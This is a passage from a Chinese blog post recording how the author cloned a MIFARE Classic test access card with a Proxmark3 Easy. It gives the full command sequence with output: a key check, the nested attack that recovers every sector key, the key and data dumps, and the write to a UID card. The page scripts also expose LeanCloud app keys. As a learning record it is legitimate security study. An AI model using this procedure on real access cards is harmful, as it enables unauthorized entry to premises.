+<p><strong>Tip:固件版本是根据固件的日期来看的</strong><br>我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行<br><pre><code class="hljs undefined">proxmark3&gt; hf mf chk <span class="hljs-number">0</span> A ffffffffffff
+chk <span class="hljs-built_in">key</span>[ <span class="hljs-number">0</span>] ffffffffffff
+--sector: <span class="hljs-number">0</span>, block:  <span class="hljs-number">0</span>, <span class="hljs-built_in">key</span> <span class="hljs-built_in">type</span>:A, <span class="hljs-built_in">key</span> <span class="hljs-built_in">count</span>: <span class="hljs-number">1</span>
+Found valid <span class="hljs-built_in">key</span>:[ffffffffffff]</code></pre></p>
+<h6 id="知一求十五"><a href="#知一求十五" class="headerlink" title="知一求十五"></a>知一求十五</h6><p>获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）<br><pre><code class="hljs undefined">proxmark3&gt; hf mf nested 1 0 A ffffffffffff 			//0是0扇区，A密钥
+Testing known keys. Sector count=16
+nested...
+Time in nested: 4.330 (inf sec per key)
+
+-----------------------------------------------
+Iterations count: 0
+
+
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|
+|<span class="hljs-string">sec</span>|<span class="hljs-string">key A           </span>|<span class="hljs-string">res</span>|<span class="hljs-string">key B           </span>|<span class="hljs-string">res</span>|
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|
+|<span class="hljs-string">000</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">001</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">002</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">003</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">004</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">005</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">006</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">007</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">008</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">009</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">010</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">011</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">012</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">013</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">014</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">015</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|</code></pre></p>
+<p>接下来导出密钥<br><pre><code class="hljs undefined">proxmark3&gt; hf mf nested 1 0 A ffffffffffff d
+Testing known keys. Sector count=16
+nested...
+Time in nested: 4.302 (inf sec per key)
+
+-----------------------------------------------
+Iterations count: 0
+
+
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|
+|<span class="hljs-string">sec</span>|<span class="hljs-string">key A           </span>|<span class="hljs-string">res</span>|<span class="hljs-string">key B           </span>|<span class="hljs-string">res</span>|
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|
+|<span class="hljs-string">000</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">001</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">002</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">003</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">004</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">005</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">006</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">007</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">008</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">009</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">010</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">011</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">012</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">013</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">014</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">015</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|
+|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|
+Printing keys to binary file dumpkeys.bin...</code></pre></p>
+<p>导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）<br><img src="/img/2018-07-26/8.png" srcset="/img/static/loading.gif" alt="8"></p>
+<h6 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h6><p>拿到密码后我们就可以导出卡上的数据到电脑里<br><pre><code class="hljs undefined">proxmark3&gt; hf mf dump
+|-----------------------------------------|
+|------ Reading sector access bits...-----|
+|-----------------------------------------|
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+	  .
+	  .
+	  .
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+|-----------------------------------------|
+|----- Dumping all blocks <span class="hljs-keyword">to</span> file... -----|
+|-----------------------------------------|
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+Successfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> sector  <span class="hljs-number">0</span>.
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+Successfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> sector  <span class="hljs-number">0</span>.
+	  .
+	  .
+	  .
+#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED
+Successfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">3</span> <span class="hljs-keyword">of</span> sector <span class="hljs-number">15</span>.
+Dumped <span class="hljs-number">64</span> blocks (<span class="hljs-number">1024</span> bytes) <span class="hljs-keyword">to</span> file dumpdata.bin</code></pre></p>
+<p>同样16进制打开<br><img src="/img/2018-07-26/9.png" srcset="/img/static/loading.gif" alt="9"><br>因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。</p>
+<h6 id="写入UID卡"><a href="#写入UID卡" class="headerlink" title="写入UID卡"></a>写入UID卡</h6><p>下一步把数据写进写UID卡<br>Proxmark3不能识别、使用bin文件，需要转换成eml格式<br>第一个方法是运行下面的命令转成eml格式<br><pre><code class="hljs undefined">proxmark3&gt; script run dumptoemul<span class="hljs-selector-class">.lua</span>
+--- Executing: ./scripts/dumptoemul<span class="hljs-selector-class">.lua</span>, args<span class="hljs-string">''</span>
+Wrote an emulator-dump to the file EA117DEE<span class="hljs-selector-class">.eml</span>
+
+-----Finished</code></pre></p>
+<p>第二个方法是运行<code>dump to EML.bat</code>脚本转成eml格式<br><img src="/img/2018-07-26/10.png" srcset="/img/static/loading.gif" alt="10"><br>写入到白卡（UID卡）上<br><pre><code class="hljs undefined">proxmark3&gt; hf mf cload  dumpdata
+Loaded <span class="hljs-keyword">from</span> <span class="hljs-built_in">file</span>: dumpdata.eml</code></pre></p>
+<p>写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了<br><strong>IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去</strong></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Proxmark3/">Proxmark3</a>
+                    
+                      <a class="hover-with-bg" href="/tags/RFID/">RFID</a>
+                    
+                      <a class="hover-with-bg" href="/tags/硬件破解/">硬件破解</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/08/03/sqli-labs2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli-labs的学习记录二（9-22）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/07/20/sqli-labs1/">
+                        <span class="hidden-mobile">sqli-labs的学习记录一（1-8）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/07/26/proxmark3/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "Proxmark3 Easy破解门禁卡学习过程")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
